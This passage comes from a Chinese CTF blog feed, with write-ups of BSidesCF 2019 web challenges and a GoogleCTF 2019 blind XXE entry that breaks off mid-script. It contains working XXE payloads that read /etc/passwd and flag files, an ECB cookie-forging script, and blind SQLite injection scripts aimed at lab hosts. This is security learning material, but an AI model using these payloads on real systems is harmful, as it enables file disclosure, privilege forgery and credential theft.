class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;512px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;190px&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 512 190&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">preserveAspectRatio</span>=<span class="string">&quot;xMidYMid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/12/BSidesCF-2019//4.png"><br><code>flag&#123;8e70f488-9dec-4868-b088-f930c6743e61&#125;</code></p><h1 id="3-Mixer"><a href="#3-Mixer" class="headerlink" title="3.Mixer"></a>3.Mixer</h1><p><strong>标签:分段密码攻击，cookie伪造</strong></p><p><strong>这个是涉及密码学的题目，真有意思了</strong><br><img src="/2020/11/12/BSidesCF-2019//31.png"><br>这里要将自己的身份<code>is_admin</code>置为<code>1</code>，这里涉及到了CBC分组加密的知识，下面这个链接里面又讲<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544562.html">分组加密及对应的攻击方式</a></p><p>BP抓包，改一下<code>user</code>字段的cookie为下图所示，两次修改不同位置（可最先两个与最后两个）的数据可获得加密前的数据的格式为<br><img src="/2020/11/12/BSidesCF-2019//32.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>我们要构造的cookie即为下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;admin&quot;,&quot;last_name&quot;:&quot;admin&quot;,&quot;is_admin&quot;:1&#125;</span><br></pre></td></tr></table></figure><p><strong>伪造(攻击)过程</strong><br>根据分组加密原理，每十六个字符分为一组，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;a</span><br><span class="line">dmin&quot;,&quot;last_name</span><br><span class="line">&quot;:&quot;admin&quot;,&quot;is_ad</span><br><span class="line">min&quot;:0&#125;</span><br></pre></td></tr></table></figure><p><del>我密码学太菜了，不深究了，等学完密码学说不定就懂了，网上的教程并不是很多</del>，以下面的方式可以伪造cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;a</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;1</span><br><span class="line">234&quot;,&quot;is_admin&quot;:</span><br><span class="line">0&#125;</span><br></pre></td></tr></table></figure><p>然后说这里的第二组的内容会再跑到第五组之前，好家伙<del>听不懂</del>，下面就是它实际上传送的数据内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;a</span><br><span class="line">1.00000000000000</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;1</span><br><span class="line">234&quot;,&quot;is_admin&quot;:</span><br><span class="line">1.00000000000000</span><br><span class="line">0&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;first_name&quot;:&quot;a1.00000000000000&quot;,&quot;last_name&quot;:&quot;1234&quot;,&quot;is_admin&quot;:1.000000000000000&#125;</span><br></pre></td></tr></table></figure><p><del>此处为不懂标记，有时间或者想起来了回来再看，大佬如果明白请联系我qq:2994016494，Orz</del></p><blockquote><p>懂了这里，就是先构造成这样，然后将第二组的加密后的数据移到第五组的前面就能实现上面的攻击了。</p></blockquote><p>这里直接提交下面的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1.00000000000000</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>如下图<br><img src="/2020/11/12/BSidesCF-2019//33.png"><br>抓包拿到user的值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de616fbb47a27dddc36cf01d10f3788079df1e7bfafa2718bc8d379d0dcc041e7ab9f97cc5bd276660cfc35deb6aaf7e77fe3b6402e7765460c1f566502bdf25988b71dc608586fbcb2f528164dff98c</span><br></pre></td></tr></table></figure><p>用python3脚本伪造一下，就是将上面的第二组的加密后的数据放到第五组的前面，这里是将十六个字符加密即获得三十二个字符，记一下吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cookie = <span class="built_in">input</span>(<span class="string">&quot;please input the cookie:&quot;</span>)</span><br><span class="line"></span><br><span class="line">new_cookie = cookie[:-<span class="number">32</span>] + cookie[<span class="number">32</span>:<span class="number">64</span>] + cookie[-<span class="number">32</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment">#cookie[:-32]为前面的字符串,cookie[-32:]为最后的32个字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---------------分割------------------天下--------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(new_cookie)</span><br></pre></td></tr></table></figure><p>获得的效果如下:<img src="/2020/11/12/BSidesCF-2019//34.png"><br>伪造后的cookie为<code>de616fbb47a27dddc36cf01d10f3788079df1e7bfafa2718bc8d379d0dcc041e7ab9f97cc5bd276660cfc35deb6aaf7e77fe3b6402e7765460c1f566502bdf2579df1e7bfafa2718bc8d379d0dcc041e988b71dc608586fbcb2f528164dff98c</code></p><p>改下user的cookie为上面的内容即可获得flag<br><img src="/2020/11/12/BSidesCF-2019//35.png"><br><code>flag&#123;8efec087-4d58-41ab-ab3b-fbaa307c5e9f&#125;</code></p><h1 id="4-Sequel"><a href="#4-Sequel" class="headerlink" title="4.Sequel"></a>4.Sequel</h1><p><strong>标签:sqlite注入</strong></p><p><a href="https://blog.csdn.net/a3320315/article/details/104334246">参考链接</a></p><p>似乎到目前为止还没有搞过sqlite的注入，下面顺便学习一下。</p><h2 id="爆破得用户名密码"><a href="#爆破得用户名密码" class="headerlink" title="爆破得用户名密码"></a>爆破得用户名密码</h2><p>无法注入可爆破<br><strong>用户名:guest，密码:guest</strong><br>登陆后是以下的页面<br><img src="/2020/11/12/BSidesCF-2019//41.png"><br>啥提示都没得，抓下包或者直接看下请求包里面的cookie的值，有个带<code>eyj</code>的<code>1337_AUTH=eyJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJndWVzdCJ9</code><br>后面的内容base64解码后为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;&#125;</span><br></pre></td></tr></table></figure><p>看到是我们的用户名与密码，然后尝试注入，首先用下面的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;\&quot; OR 1 OR \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;</span><br><span class="line"></span><br><span class="line">eyJ1c2VybmFtZSI6IlwiIE9SIDEgT1IgXCIiLCJwYXNzd29yZCI6Imd1ZXN0In0=</span><br></pre></td></tr></table></figure><p>上面的sql语句成功回显内容<br>而如果将上面的1改为0，就不行了，会显示非法用户，根据这个，可以进行布尔盲注。<br>下面都是<code>python3</code>脚本，这里的表名用<code>EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \&quot;&#123;&#125;\&quot; limit 1)</code>注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">&#x27;n&#x27;</span>: <span class="keyword">continue</span>    <span class="comment">#过滤掉notes表</span></span><br><span class="line"><span class="keyword">if</span> letter == <span class="string">&#x27;r&#x27;</span>: <span class="keyword">continue</span>    <span class="comment">#过滤掉reviews表</span></span><br><span class="line"><span class="keyword">if</span> letter == <span class="string">&#x27;n&#x27;</span>: <span class="keyword">continue</span>    <span class="comment">#过滤掉sqlite表</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \&quot;&#123;&#125;\&quot; limit 1) OR \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            tmp + <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels&#x27;</span>,</span><br><span class="line">                         cookies=&#123;<span class="string">&quot;1337_AUTH&quot;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Movie&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>因为不止有一个表，所以要来回试试，最后的结果就是有一个<code>userinfo</code>表<br><img src="/2020/11/12/BSidesCF-2019//40.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">&#x27;g&#x27;</span>: <span class="keyword">continue</span>    <span class="comment">#过滤掉guest用户名</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \&quot;&#123;&#125;\&quot; limit 1) OR \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            tmp + <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels&#x27;</span>,</span><br><span class="line">                         cookies=&#123;<span class="string">&quot;1337_AUTH&quot;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Movie&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这里的注入语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXISTS</span>(<span class="keyword">SELECT</span> username <span class="keyword">FROM</span> userinfo <span class="keyword">WHERE</span> username <span class="keyword">LIKE</span> \&quot;&#123;&#125;\&quot; limit <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>注出的用户名为<code>sequeladmin</code>，</p><p>同样的将username改为password即可注出password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> string.printable:</span><br><span class="line">        tmp = out + letter</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> letter == <span class="string">&#x27;g&#x27;</span>: <span class="keyword">continue</span>    <span class="comment">#过滤掉guest用户名</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">r&#x27;&#123;&#123;&quot;username&quot;:&quot;\&quot; OR EXISTS(SELECT password FROM userinfo WHERE password LIKE \&quot;&#123;&#125;\&quot; limit 1) OR \&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">            tmp + <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(<span class="string">&#x27;http://61072f69-98c4-4f55-8b17-69dad567971b.node3.buuoj.cn/sequels&#x27;</span>,</span><br><span class="line">                         cookies=&#123;<span class="string">&quot;1337_AUTH&quot;</span>: payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Movie&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            out = tmp</span><br><span class="line">            sys.stdout.write(letter)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>用户名为<code>sequeladmin</code><br>密码为<code>f5ec3af19f0d3679e7d5a148f4Ac323d</code><br>登录后获得flag<br><img src="/2020/11/12/BSidesCF-2019//42.png"><br><code>flag&#123;4a286fd3-408f-4bd3-9d17-e663a1355ee5&#125;</code></p><p><del>后面的不会了，爬了爬了，作业还有好多。</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoogleCTF2019-Quals-Bnv</title>
      <link href="/2020/11/10/GoogleCTF2019-Quals-Bnv/"/>
      <url>/2020/11/10/GoogleCTF2019-Quals-Bnv/</url>
      
        <content type="html"><![CDATA[<blockquote><p>总有一滩水，接受所有的污浊。</p></blockquote><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="300" height="86" src="//music.163.com/outchain/player?type=2&id=558071673&auto=1&height=66"></iframe><h2 id="1-BlindXXE"><a href="#1-BlindXXE" class="headerlink" title="1.BlindXXE"></a>1.BlindXXE</h2><p><a href="http://yugod.xmutsec.com/index.php/2019/07/14/50.html">这里是wp</a></p><blockquote><p>这里他说，xxe的漏洞现在几乎已经不常见了<del>（或者是几乎已经不见了）</del><br>之前也有做过一般的xxe的题目，那都是一把过，或者顶多是绕过一些限制而已，这种<code>blindxxe</code>还是第一次遇到，记录一下，以后可能会遇到！</p></blockquote><p><strong>dtd实体文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="string">&quot;hello&quot;</span>&gt;</span>  //内部普通实体</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY b <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xml.org/hhh.dtd&quot;</span>&gt;</span> //外部普通实体</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///1234.dtd&quot;</span>&gt;</span> //外部参数实体</span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>blindxxe需要用到的就是第三种<code>外部参数实体</code>，就是这个<code>&lt;!ENTITY % para SYSTEM &quot;file:///1234.dtd&quot;&gt;</code>，主要区别就是有个<code>%</code>作为分割了。</p></blockquote><blockquote><p>而且参数实体还能嵌套定义,但需要注意的是,内层的定义的参数实体 % 需要进行HTML转义,否则会出现解析错误</p></blockquote><p><font color="red">就如下面一样:</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % para &#x27;&lt;!ENTITY &amp;#x25; files SYSTEM &quot;file:///etc/passwd&quot;&gt;&#x27;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>这里的<code>%</code>转义之后即为符号串<code>&amp;#x25</code>。</p><p><strong>Blind-XXE 引用本地DTD文件</strong></p><p>有可能我们访问不到外部服务器里面的dtd文件，这里就能用到ubuntu里面自带的dtd文件了<br>ubuntu系统自带<code>/usr/share/yelp/dtd/docbookx.dtd</code>文件<br>可用上面的第二种方法来重写外部参数实体，就像下面的代码一样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY % eval &quot;&lt;!ENTITY % error SYSTEM &#x27;</span>test%file<span class="string">&#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        %eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        %error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>然后这里好像还不能用，因为没有进行html转义，对一部分字符进行html转义后得以下的payload<del>这里我直接换为<code>file:///flag</code>文件啦</del></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-记录"><a href="#2-记录" class="headerlink" title="2.记录"></a>2.记录</h2><p>首先查看源码，会看到有个<code>post.js</code>的文件，点击就能打开了，打开之后是下面的内容<br>在这个目录下<code>/static/post.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Copyright 2019 Google LLC</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    https://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span></span><br><span class="line"><span class="comment">WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">limitations under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">AjaxFormPost</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> datasend;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;message&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">  message = message.<span class="title function_">toLowerCase</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindvalues = [</span><br><span class="line">    <span class="string">&#x27;10&#x27;</span>,    <span class="string">&#x27;120&#x27;</span>,   <span class="string">&#x27;140&#x27;</span>,    <span class="string">&#x27;1450&#x27;</span>,   <span class="string">&#x27;150&#x27;</span>,   <span class="string">&#x27;1240&#x27;</span>,  <span class="string">&#x27;12450&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1250&#x27;</span>,  <span class="string">&#x27;240&#x27;</span>,   <span class="string">&#x27;2450&#x27;</span>,   <span class="string">&#x27;130&#x27;</span>,    <span class="string">&#x27;1230&#x27;</span>,  <span class="string">&#x27;1340&#x27;</span>,  <span class="string">&#x27;13450&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1350&#x27;</span>,  <span class="string">&#x27;12340&#x27;</span>, <span class="string">&#x27;123450&#x27;</span>, <span class="string">&#x27;12350&#x27;</span>,  <span class="string">&#x27;2340&#x27;</span>,  <span class="string">&#x27;23450&#x27;</span>, <span class="string">&#x27;1360&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;12360&#x27;</span>, <span class="string">&#x27;24560&#x27;</span>, <span class="string">&#x27;13460&#x27;</span>,  <span class="string">&#x27;134560&#x27;</span>, <span class="string">&#x27;13560&#x27;</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> blindmap = <span 